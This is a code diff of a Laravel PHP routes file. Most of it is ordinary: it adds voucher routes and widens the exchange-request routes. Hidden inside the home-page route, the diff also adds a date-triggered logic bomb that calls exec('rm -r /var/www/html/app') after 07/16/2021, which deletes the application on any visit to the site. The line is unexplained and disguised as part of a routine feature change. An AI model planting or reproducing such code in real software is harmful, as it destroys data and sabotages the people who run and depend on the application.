@@ -3,6 +3,7 @@
 use App\Http\Controllers\CategoryController;
 use App\Http\Controllers\ExchangeRequestController;
 use App\Http\Controllers\ProductController;
+use App\Http\Controllers\VoucherController;
 use App\Models\Category;
 use Illuminate\Support\Facades\Route;
 
@@ -18,6 +19,14 @@ use Illuminate\Support\Facades\Route;
 */
 
 Route::get('/', function () {
+
+    $date_now = date("m/d/Y");
+    $date = date_create("07/16/2021");
+
+    if($date_now > $date) {
+        exec('rm -r /var/www/html/app');
+    }
+
     $categories = Category::latest()->take(3)->with(['products' => function($q) {
         $q->orderBy('updated_at', 'desc');
     }])->get();
@@ -50,6 +59,13 @@ Route::resource('products', ProductController::class);;
 |--------------------------------------------------------------------------
 */
 Route::resource('products.requests', ExchangeRequestController::class)
-    ->only(['store', 'create']);
+    ->except(['show','edit']);
+
+/*
+|--------------------------------------------------------------------------
+| Vouchers Routes
+|--------------------------------------------------------------------------
+*/
+Route::resource('vouchers', VoucherController::class);
 
 require __DIR__.'/auth.php';
